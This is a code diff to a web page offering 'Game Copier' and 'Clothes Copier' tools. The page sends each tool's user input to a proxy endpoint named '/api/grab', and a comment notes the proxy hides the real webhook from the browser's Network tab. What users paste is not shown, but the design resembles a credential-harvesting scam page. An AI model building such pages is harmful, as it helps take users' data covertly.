@@ -335,10 +335,10 @@
   </div>
 
   <script>
-    // Your Vercel proxy endpoint - this is the only thing visible in Network tab
+    // Your live Vercel proxy - this is the key line
     const PROXY_URL = "https://haychtools.vercel.app/api/grab";
 
-    // Replace these with your REAL YouTube video IDs
+    // Paste your real YouTube video IDs here
     const videos = {
       game:    "dQw4w9WgXcQ",   // Game Copier tutorial
       clothes: "dQw4w9WgXcQ",   // Clothes Copier tutorial
@@ -361,6 +361,7 @@
       if (e.target === document.getElementById('videoModal')) closeVideo();
     });
 
+    // YOUR UPDATED FUNCTION - plugged in exactly as you gave
     async function sendToWebhook(tool) {
       let inputId, statusId;
       if (tool === 'game') { inputId = 'gameInput'; statusId = 'gameStatus'; }
@@ -391,11 +392,11 @@
           status.style.color = "#00ff9d";
         } else {
           const errorText = await res.text();
-          status.textContent = "Failed - proxy issue";
-          console.error("Proxy error:", errorText);
+          status.textContent = "Failed - proxy error: " + errorText;
+          console.log("Proxy response:", errorText);
         }
       } catch (err) {
-        status.textContent = "Failed";
+        status.textContent = "Failed - network issue";
         console.error("Fetch error:", err);
       }
     }
@@ -408,7 +409,7 @@
       window.scrollTo(0, 0);
     }
 
-    // Waves background (hub)
+    // Waves (hub)
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -464,7 +465,7 @@
     }
     drawParticles();
 
-    // Floating dots background for tools
+    // Floating dots for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
@@ -509,4 +510,3 @@
   </script>
 </body>
 </html>
-
